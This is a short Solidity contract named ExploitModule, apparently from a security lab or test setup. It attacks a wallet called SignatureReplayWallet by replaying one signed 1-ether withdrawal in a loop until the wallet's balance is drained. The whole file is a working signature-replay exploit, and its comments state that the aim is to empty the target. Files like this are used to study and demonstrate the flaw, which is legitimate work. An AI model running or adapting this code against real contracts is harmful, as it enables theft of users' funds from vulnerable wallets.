// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {SignatureReplayWallet} from "../src/SignatureReplayWallet.sol";

contract ExploitModule {
    SignatureReplayWallet public targetContract;

    constructor(address _target) payable {
        targetContract = SignatureReplayWallet(payable(_target));
    }

    function runSignatureReplay(bytes32 r, bytes32 s, uint8 v) external {
        // Replay the supplied signature repeatedly with the exact signed payload.
        // The signature was created for a withdrawal of 1 ether to this contract.
        // We can drain the entire balance by replaying the signature multiple times.
        while (address(targetContract).balance >= 1 ether) {
            targetContract.executeWithSignature(
                address(this),
                1 ether,
                "",
                r,
                s,
                v
            );
        }
    }

    receive() external payable {
        // Reentrancy / callback handling if applicable
    }
}